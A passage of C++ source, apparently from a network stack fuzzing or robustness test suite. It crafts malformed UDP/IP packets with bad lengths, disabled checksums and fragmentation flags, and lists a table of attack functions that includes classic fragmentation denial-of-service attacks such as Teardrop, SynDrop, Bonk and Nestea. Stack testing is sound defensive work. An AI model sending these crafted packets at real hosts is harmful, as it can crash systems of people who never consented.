				pUDPPacket->IPHeader.SetAutoCalcDatagramLength(OFF);
				pUDPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + UDPHEADER_SIZE + 108);
				
				// Initialize buffer for the remaining packet data
				memset(PayloadBuffer, (int)'a', sizeof(PayloadBuffer));
				pUDPPacket->SetUserBuffer(PayloadBuffer, 108, TRUE);
				break;
			default:
				pUDPPacket->UDPHeader.SetSrcPort(UDPPORT_SOURCE);
				pUDPPacket->UDPHeader.SetDestPort(UDPPORT_DEST);
				pUDPPacket->UDPHeader.SetAutoCalcLength(OFF);
				pUDPPacket->UDPHeader.SetLength(UDPHEADER_SIZE + 256);
				pUDPPacket->UDPHeader.SetAutoCalcChecksum(OFF);
				pUDPPacket->UDPHeader.SetChecksum(0);

				pUDPPacket->IPHeader.SetFlag(IPFLAG_MOREFRAGS);
				pUDPPacket->IPHeader.SetFragOffset(0);
				
				// Manually calculate length.  We're really adding extra data.
				pUDPPacket->IPHeader.SetAutoCalcDatagramLength(OFF);
				pUDPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + UDPHEADER_SIZE + 296);
				
				// Initialize buffer for the remaining packet data
				memset(PayloadBuffer, (int)'a', sizeof(PayloadBuffer));
				pUDPPacket->SetUserBuffer(PayloadBuffer, 256, TRUE);
				break;
			}

			// Send the packet
			pInterface->Send(*pUDPPacket);
		}
		catch(CSpartaException *Ex)
		{
			delete Ex;
		}

		// Release the packet
		pUDPPacket ? delete pUDPPacket : 0;
		pUDPPacket = NULL;
	}

	return TRUE;
}

PATTACK_FUNCTION g_IPAttackFunctions[IPATTACK_MAXTEST] = 
{
	IPVersionSixAttack,
	IPVersionBadAttack,
	IPHeaderLenBelowMinAttack,
	IPHeaderLenMaxAttack,
	IPHeaderLenAboveTotalLenAttack,
	IPHeaderLenAboveAvailAttack,
	IPTosNormalAttack,
	IPTosNetControlAttack,
	IPTosLowDelayAttack,
	IPTosHighThroughputAttack,
	IPTosHighReliabilityAttack,
	IPTosReservedAttack,
	IPLengthBelowMinAttack,
	IPLengthAtMinAttack,
	IPLengthAboveMinAttack,
	IPLengthAboveTotalAttack,
	IPLengthBelowTotalAttack,
	IPLengthMaxAttack,
	IPIDMinAttack,
	IPIDMaxAttack,
	IPFlagReservedSetAttack,
	IPFlagDontFragAndMoreFragsAttack,
	IPTtlMinAttack,
	IPTtlMaxAttack,
	IPProtocolUnsupportedAttack,
	IPProtocolICMPTooSmallAttack,
	IPProtocolIGMPTooSmallAttack,
	IPProtocolTCPTooSmallAttack,
	IPProtocolUDPTooSmallAttack,
	IPProtocolUnsupportedTooSmallAttack,
	IPChecksumBadAttack,
	IPOptionsAboveAvailAttack,
	IPOptionsExactSizeAttack,
	IPOptionsEndOfOpsLastAttack,
	IPOptionsEndOfOpsFirstAttack,
	IPFragMaxSimulReassemblyAttack,
	IPFragAboveMaxSimulReassemblyAttack,
	IPFragFullReverseAttack,
	IPFragMidReverseAttack,
	IPFragLastInSecondAttack,
	IPFragMixedSizeAttack,
	IPFragOneHundredAttack,
	IPFragMultipleLastFragmentAttack,
	IPFragOverlappingFragmentsAttack,
	IPFragMaxDatagramSizeAttack,
	IPFragMaxReassemblySizeAttack,
	IPFragAboveMaxReassemblySizeAttack,
	IPFragOversizedFragmentsAttack,
	IPAttackTeardropAttack,
	IPAttackNewTeardropAttack,
	IPAttackImpTeardropAttack,
	IPAttackSynDropAttack,
	IPAttackZeroLenOptAttack,
	IPAttackBonkAttack,
	IPAttackNesteaAttack
};
